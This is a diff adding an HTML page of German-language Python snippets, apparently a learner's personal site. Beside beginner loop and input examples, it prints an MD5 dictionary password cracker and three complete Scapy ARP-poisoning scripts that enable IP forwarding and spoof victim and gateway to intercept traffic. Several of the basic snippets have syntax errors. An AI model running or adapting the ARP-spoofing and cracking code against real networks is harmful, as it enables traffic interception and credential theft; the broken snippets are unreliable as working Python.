@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+        <meta http-equiv="X-UA-Compatible" content="ie=edge">
+        <title>First Website</title>
+
+        <!-- Lokal Bootstrap CSS -->
+        <!--<link rel="stylesheet" href="../css/bootstrap.min.css">-->
+
+        <!-- CDN wenn public -->
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+        
+        <!-- Style.css -->
+        <!--<link rel="stylesheet" href="css/style.css">-->
+        <!-- Google Fonts "%7C" replaces "|" for w3c validation -->
+        <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">        
+    </head>
+    <style>
+        body {
+            background: black;
+        }
+        /*.container-fluid {
+            background: lightgrey;
+        }*/
+        h1, h5, h6 p {
+            font-family: 'Lato', sans-serif;
+        }
+        h5, h6 {
+            text-transform: uppercase;
+            /*letter-spacing: .1rem;*/
+            font-weight: 800;
+            padding-left: 3%;
+        }
+        h1 {
+            font-weight: 800;
+        }
+        p {
+            padding-left: 5%;
+            margin-bottom: 0rem;
+            line-height: 120%;
+            /*letter-spacing: .1rem;*/
+        }
+        .tab {
+            padding-left: 8%;
+        }
+        .tabtab {
+            padding-left: 11%;
+        }
+        .tabtabtab {
+            padding-left: 14%;
+        }
+        .tabtabtabtab {
+            padding-left: 17%;
+        }
+    </style>
+    <body>
+        <div class="container-fluid pt-3 pb-3 bg-secondary text-white">
+            <h1 class="text-uppercase text-center">Python</h1>
+            <h3 class="text-center">Ein Paar Python Snippets</h3>
+        </div>
+
+        <div class="container-fluid p-3 my-3 bg-light">
+            <h6 class="text-uppercase">Beispiele für While Schleifen</h6>
+            <p>zaehler = 0</p>
+            <p>people = []</p>
+            <p>while zaehler <= 3:</p>
+            <p class="tab">name = input('Write a Name to the list: ')</p>
+            <p class="tab">people.append(name)</p>
+            <p class="tab">zaehler = zaehler + 1</p>
+            <p>print(people)</p>
+            <p>print(', ' .join(people))</p>
+            <p class="pb-3">print(*people, sep = ', ')</p>
+        </div>
+
+        
+
+        <div class="container-fluid p-3 my-3 bg-light">
+            <p>result = 0</p>
+            <p>zahlen = []</p>
+            <p>print('Bei Eingabe der Zahl 0 wird das Ergebnis berechnet</p>
+            <p>zahl = int(input('Erste Zahl: '))</p>
+            <p>zahlen.append(zahl)</p>
+            <p>while zahl > 0:</p>
+            <p class="tab">result = result + zahl</p>
+            <p class="tab">zahl = int(input('Naechste Zahl: '))</p>
+            <p class="tab">zahlen.append(zahl)</p>
+            <p>print(zahlen)</p>
+            <p>print(result)</p>
+            <p>#Formatierte Ausgabe</p>
+            <p>print('str(zahlen)[1:-1])</p>
+            <p>print(f'Ergebnis' {result})</p>
+            <p>#Formatierte Ausgabe</p>
+            <p class="pb-5">print('Das Ergebnis von ' ,(str(zahlen)[1:-2]), 'ist' ,result)</p>
+        </div>
+
+        <div class="container-fluid p-3 my-3 bg-light">
+            <h6 class="text-uppercase">Beispiele Liste mit for und while Schleife</h6>
+            <p>friends = ["Kevin", "Karen", "Jim", "2", "Oskar"]</p>
+            <p>print(friends)</p>
+            <p class="pb-5">print(friends[0], [4])</p>
+
+            <p>names = ["Karsten", "Bob", "Hans"]</p>
+            <p>for name in names:</p>
+            <p class="tab pb-5">print(name)</p>
+
+            <p>def line():</p>
+            <p class="tab">print("-"*30)</p>
+            <p>while True:</p>
+            <p class="tab">result = 0</p>
+            <p class="tab">zahlen = []</p>
+            <p class="tab">zahl = float(input("Erste Zahl: "))</p>
+            <p class="tab">zahlen.append(zahl)</p>
+            <p class="tab">while zahl > 0:</p>
+            <p class="tabtab">result = result + zahl</p>
+            <p class="tabtab">zahl = float(input("Naechste Zahl: "))</p>
+            <p class="tabtab">line()</p>
+            <p class="tabtab">zahlen.append(zahl)</p>
+            <p class="tabtab">for x in zahlen:</p>
+            <p class="tabtabtab">print(x)</p>
+            <p class="tab">line()</p>
+            <p class="tab">print(f"Das Ergebnis ist {result}")</p>
+            <p class="tab">while True:</p>
+            <p class="tabtab">nochmal = input("Nochmal y oder n : ")
+            <p class="tabtab">if nochmal in ["y","n"]:</p>
+            <p class="tabtabtab">break</p>
+            <p class="tabtab">else:</p>
+            <p class="tabtabtab">print("Falsche Eingabe, Bitte y oder n : ")</p>
+            <p class="tab">if nochmal == "n":</p>
+            <p class="tabtab">break</p>
+            <p class="pb-3">print("Das Wars")</p>
+        </div>
+
+        <div class="container-fluid p-3 my-3 bg-light">
+            <h6 class="text-uppercase">Name und Alter abfragen</h6>
+            <p>while True:</p>
+            <p class="tab">firstName = input("Vorname: ")</p>
+            <p class="tab">lastName = input("Nachname: ")</p>
+            <p class="tab">while True:</p>
+            <p class="tabtab">try:</p>
+            <p class="tabtabtab">age = int(input("Alter: "))</p>
+            <p class="tabtabtab">if age <= 40:</p>
+            <p class="tabtabtabtab">print("Dein Name ist {} {} und du bist {} Jahre jung.".format(firstName, lastName, age))</p>
+            <p class="tabtabtab">else:</p>
+            <p class="tabtabtabtab">print("Dein Name ist {} {} und du bist {} Jahre alt.".format(firstName, lastName, age))</p>
+            <p class="tabtabtab">break</p>
+            <p class="tabtab">except ValueError:</p>
+            <p class="tabtabtab">print("Bitte ein Zahl eingeben!!!")</p>
+            <p class="tab">while True:</p>
+            <p class="tabtab">again = input("Nochmal ... Bitte y or n eingeben: ")</p>
+            <p class="tabtab">if again in ["y","n"]:</p>
+            <p class="tabtabtab">break</p>
+            <p class="tabtab">else:</p>
+            <p class="tabtabtab">print("Falsche Eingaben ... Bitte y or n :")</p>
+            <p class="tab">if again == "n":</p>
+            <p class="tabtab">break</p>
+            <p class="pb-3">print("Programm ist beendet!")</p>
+        </div>
+
+        <div class="container-fluid p-3 my-3 bg-light">
+            <h6 class="text-uppercase">Kennwort Crack md5</h6>
+            <p>import hashlib</p>
+            <p>hash_wert = input("Bitte den md5 Hashwert eingeben: "</p>
+            <p>wordlist = input("Bitte das Dictionary-File eingeben: "</p>
+            <p>try</p>
+            <p class="tab">file = open(f"{wordlist}", "r")</p>
+            <p class="tab">for line in file:</p>
+            <p class="tabtab">word = line.strip()</p>
+            <p class="tabtab">if hashlib.md5(word.encode()).hexdigest() == hash_wert:</p>
+            <p class="tabtabtab">print(f"Der Hashwert {hash_wert} ist das Kennwort {word}")</p>
+            <p class="tabtabtab">break</p>
+            <p class="tab">file.close()</p>
+            <p>except:</p>
+            <p class="tab">print("Das Dictionary-File {wordlist} existiert nicht!")</p>
+            <p class="pb-3">print("Programm ist beendet!")</p>
+        </div>
+
+        <div class="container-fluid p-3 my-3 bg-light">
+            <h6 class="text-uppercase">Python Scapy Arp-Poisioning</h6>
+            <p>from scapy.all import *</p>
+            <p>import time</p>
+            <p>import os</p>
+            <br>
+            <p>def clearscreen():</p>
+            <p class="tab">os.system("clear")</p>
+            <br>
+            <p>def doubleline():</p>
+            <p class="tab">print("=" *100)</p>
+            <br>
+            <p>clearscreen()</p>
+            <p>doubleline()</p>
+            <br>
+            <p>ipForward = "/proc/sys/net/ipv4/ip_forward"</p>
+            <p>#Enable IP-Forwarding</p>
+            <p>file = open(f"{ipForward}", "w")</p>
+            <p>file.write("1")</p>
+            <p>file = open(f"{ipForward}", "r")</p>
+            <p>for line in file:</p>
+            <p class="tab">line = line.strip()</p>
+            <p class="tab">print(f"IP-Forward ist auf {line} gesetzt!")</p>
+            <p>file.close()</p>
+            <br>
+            <p>doubleline()</p>
+            <br>
+            <p>victim_ip = input("IP-Adresse vom Victim-PC eingeben: ")</p>
+            <p>gateway_ip = input("IP-Adresse vom Gateway eingeben: ")</p>
+            <br>
+            <p>doubleline()</p>
+            <br>
+            <p>#IP-Adresse vom lokalen Rechner (Attaker host_ip)</p>
+            <p>host_ip = get_if_addr(conf.iface)</p>
+            <p>print(f"Lokale Attaker-Host IP-Adresse ist: {host_ip}")</p>
+            <br>
+            <p>doubleline()</p>
+            <br>
+            <p>#Spoofing victim_ip gateway_ip</p>
+            <p>victim_mac = getmacbyip(victim_ip)</p>
+            <p>arp_response = ARP(pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, op="is-at")</p>
+            <p>send(arp_response)</p>
+            <p>victim_mac = ARP().hwsrc</p>
+            <br>
+            <p>try:</p>
+            <p class="tab">while True:</p>
+            <p class="tabtab">print(f"[+] Send to {victim_ip} : {gateway_ip} is at {victim_mac} on {host_ip}")</p>
+            <p class="tabtab">time.sleep(1)</p>
+            <p>except KeyboardInterrupt:</p>
+            <p class="tab">print("")</p>
+            <p class="tab">print("[+] Deteced CRTL-c .... Network (MAC-Address) will restore ....")</p>
+            <p class="tab">victim_mac = getmacbyip(victim_ip)</p>
+            <p class="tab">gateway_mac = getmacbyip(gateway_ip)</p>
+            <p class="tab">arp_response = ARP(pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac, op="is-at")</p>
+            <p class="tab">send(arp_response, count=7)</p>
+            <p class="tab">time.sleep(1)</p>
+            <p class="tab">print(f"[+] Send to {victim_ip} : {gateway_ip} is at {victim_mac} on {victim_ip}")</p>
+            <br>
+            <p>doubleline()</p>
+            <br>
+            <p>#Disable IP-Forwarding</p>
+            <p>file = open(f"{ipForward}", "w")</p>
+            <p>file.write("0")</p>
+            <p>file = open(f"{ipForward}", "r")</p>
+            <p>for line in file:</p>
+            <p class="tab">line = line.strip()</p>
+            <p class="tab">print(f"IP-Forward ist auf {line} gesetzt!")</p>
+            <p>file.close()</p>
+            <br>
+            <p>doubleline()</p>
+            <p class="pb-3">print("Programm ist beendet!")</p>
+        </div>
+
+        <div class="container-fluid p-3 my-3 bg-light">
+            <h6 class="text-uppercase">Python Scapy Arp-Poisioning mit CLI</h6>
+            <p>from scapy.all import *</p>
+            <p>import sys</p>
+            <p>import time</p>
+            <p>import os</p>
+            <br>
+            <p>def enable_ip_forward():</p>
+            <p class="tab">ipForwardFile = "/proc/sys/net/ipv4/ip_forward"</p>
+            <p class="tab">file = open("{}".format(ipForwardFile),"w")</p>
+            <p class="tab">file.write("1")</p>
+            <p class="tab">file = open("{}".format(ipForwardFile),"r")</p>
+            <p class="tab">for line in file:</p>
+            <p class="tabtab">line = line.strip()</p>
+            <p class="tabtab">print("IP-Forward ist auf {} gesetzt!".format(line))</p>
+            <p class="tab">file.close()</p>
+            <br>
+            <p>def disable_ip_forward():</p>
+            <p class="tab">ipForwardFile = "/proc/sys/net/ipv4/ip_forward"</p>
+            <p class="tab">file = open("{}".format(ipForwardFile),"w")</p>
+            <p class="tab">file.write("0")</p>
+            <p class="tab">file = open("{}".format(ipForwardFile),"r")</p>
+            <p class="tabtab">for line in file:</p>
+            <p class="tabtab">line = line.strip()</p>
+            <p class="tabtab">print("IP-Forward ist auf {} gesetzt!".format(line))</p>
+            <p class="tab">file.close()</p>
+            <br>
+            <p>def get_mac(ip):</p>
+            <p class="tab">ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),timeout=2,verbose=0)</p>
+            <p class="tab">if ans:</p>
+            <p class="tabtab">return ans[0][1].src</p>
+            <br>
+            <p>def spoof(victim_ip, gateway_ip):</p>
+            <p class="tab">victim_mac = get_mac(gateway_ip)</p>
+            <p class="tab">arp_response = ARP(pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, op="is-at")</p>
+            <p class="tab">send(arp_response, verbose=0)</p>
+            <p class="tab">attacker_mac = ARP().hwsrc</p>
+            <p class="tab">print(f"Send to {victim_ip} : {gateway_ip} is-at {attacker_mac}")</p>
+            <br>
+            <p>def restore(victim_ip, gateway_ip):</p>
+            <p class="tab">victim_mac = get_mac(victim_ip)</p>
+            <p class="tab">gateway_mac = get_mac(gateway_ip)</p>
+            <p class="tab">arp_response = ARP(pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac)</p>
+            <p class="tab">send(arp_response, count=7, verbose=0)</p>
+            <p class="tab">time.sleep(1)</p>
+            <p class="tab">print("[+] Sent to {} : {} is-at {}".format(victim_ip, gateway_ip, gateway_mac))</p>
+            <br>
+            <p>if __name__ == "__main__":</p>
+            <p class="tab">if len(sys.argv) != 3:</p>
+            <p class="tabtab">print("[+] Usage : {} -Victim-IP-  -Gateway-IP- !!!" .format(sys.argv[0]))</p>
+            <p class="tabtab">print("[++] For finish programm type CRTL-c [++]")</p>
+            <p class="tabtab">sys.exit(0)</p>
+            <p class="tab">"""</p>
+            <p class="tab">victim = str(sys.argv[1])</p>
+            <p class="tab">gateway = str(sys.argv[2])</p>
+            <p class="tab">"""</p>
+            <p class="tab">victim = "{}".format(sys.argv[1])</p>
+            <p class="tab">gateway = "{}".format(sys.argv[2])</p>
+            <p class="tab">enable_ip_forward()</p>
+            <p class="tab">try:</p>
+            <p class="tabtab">while True:</p>
+            <p class="tabtabtab">spoof(victim, gateway)</p>
+            <p class="tabtabtab">spoof(gateway, victim)</p>
+            <p class="tabtabtab">time.sleep(1)</p>
+            <p class="tab">except KeyboardInterrupt:</p>
+            <p class="tabtab">print("\r[*** Detect CRTL-c ! Restoring the Network ....]\n")</p>
+            <p class="tabtab">restore(victim, gateway)</p>
+            <p class="tabtab">restore(gateway, victim)</p>
+            <p class="tabtab">disable_ip_forward()</p>
+            <p class="pb-3 tab">print("--- Programm ist beendet ---")</p>
+        </div>
+
+        <div class="container-fluid p-3 my-3 bg-light">
+            <h6 class="text-uppercase">Python Scapy Arp-Poisioning mit Funktion und OS</h6>
+            <p>from scapy.all import *</p>
+            <p>import time</p>
+            <p>import os</p> 
+            <br>
+            <p>def doubleline():</p>
+            <p class="tab">print("=" * 100)</p>
+            <br>
+            <p>def clearscreen():</p>
+            <p class="tab">os.system("clear")</p>
+            <br>
+            <p>def enable_ip_forward():</p>
+            <p class="tab">ipForwardFile = "/proc/sys/net/ipv4/ip_forward"</p>
+            <p class="tab">file = open(f"{ipForwardFile}", "w")</p>
+            <p class="tab">file.write("1")</p>  
+            <p class="tab">file = open(f"{ipForwardFile}", "r")</p>
+            <p class="tab">for line in file:</p>
+            <p class="tabtab">line = line.strip()</p>
+            <p class="tabtab">print(f"IP-Forwarding auf {line} gesetzt!")</p>
+            <p class="tab">file.close()</p>
+            <br>
+            <p>def disable_ip_forward():</p>
+            <p class="tab">ipForwardFile = "/proc/sys/net/ipv4/ip_forward"</p>
+            <p class="tab">file = open(f"{ipForwardFile}", "w")</p>
+            <p class="tab">file.write("0")</p>
+            <p class="tab">file = open(f"{ipForwardFile}", "r")</p>
+            <p class="tab">for line in file:</p>
+            <p class="tabtab">line = line.strip()</p>
+            <p class="tabtab">print(f"IP-Forwarding auf {line} gesetzt!")</p>
+            <p class="tab">file.close()</p>
+            <br>
+            <p>def get_mac(ip):</p>
+            <p class="tab">ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)</p>
+            <p class="tab">if ans:</p>
+            <p class="tabtab">return ans[0][1].src</p>
+            <br>
+            <p>def spoof(victim_ip, gateway_ip):</p>
+            <p class="tab">victim_mac = get_mac(victim_ip)</p>
+            <p class="tab">arp_response = ARP(pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, op="is-at")</p>
+            <p class="tab">send(arp_response, verbose=0)</p>
+            <p class="tab">attacker_mac = ARP().hwsrc</p>
+            <p class="tab">print(f"Send to {victim_ip} : {gateway_ip} is-at {attacker_mac}")</p>
+            <br>
+            <p>def restore(victim_ip, gateway_ip):</p>
+            <p class="tab">victim_mac = get_mac(victim_ip)</p>
+            <p class="tab">gateway_mac = get_mac(gateway_ip)</p>
+            <p class="tab">arp_response = ARP(pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac)</p>
+            <p class="tab">send(arp_response, count=7, verbose=0)</p>
+            <p class="tab">time.sleep(1)</p>
+            <p class="tab">print(" [+] Sent to {} : {} is-at {}".format(victim_ip, gateway_ip, gateway_mac))</p>
+
+            <p>if __name__ == "__main__":</p>
+            <p class="tab">clearscreen()</p>
+            <p class="tab">doubleline()</p>
+            <p class="tab">enable_ip_forward()</p>
+            <p class="tab">victim = input("Victim/Target IP-Adresse eingeben: ")</p>
+            <p class="tab">gateway = input("Gateway IP-Adresse eingeben: ")</p>
+            <p class="tab">doubleline()</p>
+            <p class="tab">try:</p>
+            <p class="tabtab">while True:</p>
+            <p class="tabtabtab">spoof(victim, gateway)</p>
+            <p class="tabtabtab">spoof(gateway, victim)</p>
+            <p class="tabtabtab">time.sleep(1)</p>
+            <p class="tab">except KeyboardInterrupt:</p>
+            <p class="tabtab">print("")</p>
+            <p class="tabtab">print("[*** Detect CRTL-c ! Restoring the Network ....]")</p>
+            <p class="tabtab">print("")</p>
+            <p class="tabtab">restore(victim, gateway)</p>
+            <p class="tabtab">restore(gateway, victim)</p>
+            <p class="tab">doubleline()</p>    
+            <p class="tab">disable_ip_forward()</p>
+            <br>
+            <p>doubleline()</p>
+            <p class="pb-3">print("Das Programm ist beendet!")</p>
+        </div>
+
+        <!-- ====================================== Script Source Files ================================================== -->
+
+        <!-- jQuery -->
+        <!--<script src="js/jquery-3.4.1.min.js"></script>-->
+        <!-- Bootstrap JS -->
+        <!--<script src="js/bootstrap.min.js"></script>-->
+        <!-- Font Awesome -->
+        <!--<script src="js/all.min.js"></script>-->
+
+        <!--Lokal-->
+        <!-- Optionales JavaScript -->
+        <!-- jQuery, dann Popper.js, dann Bootstrap JS -->
+        <!--<script src="js/jquery-3.5.1.slim.min.js"></script>
+        <script src="js/popper.js"></script>
+        <script src="js/bootstrap.min.js"></script>-->
+
+        <!--CDN wenn public-->
+        <!-- Optional JavaScript -->
+        <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+        <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+        <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
+        
+        <!-- ==================================== End of Script Source Files =================================== -->
+    </body>
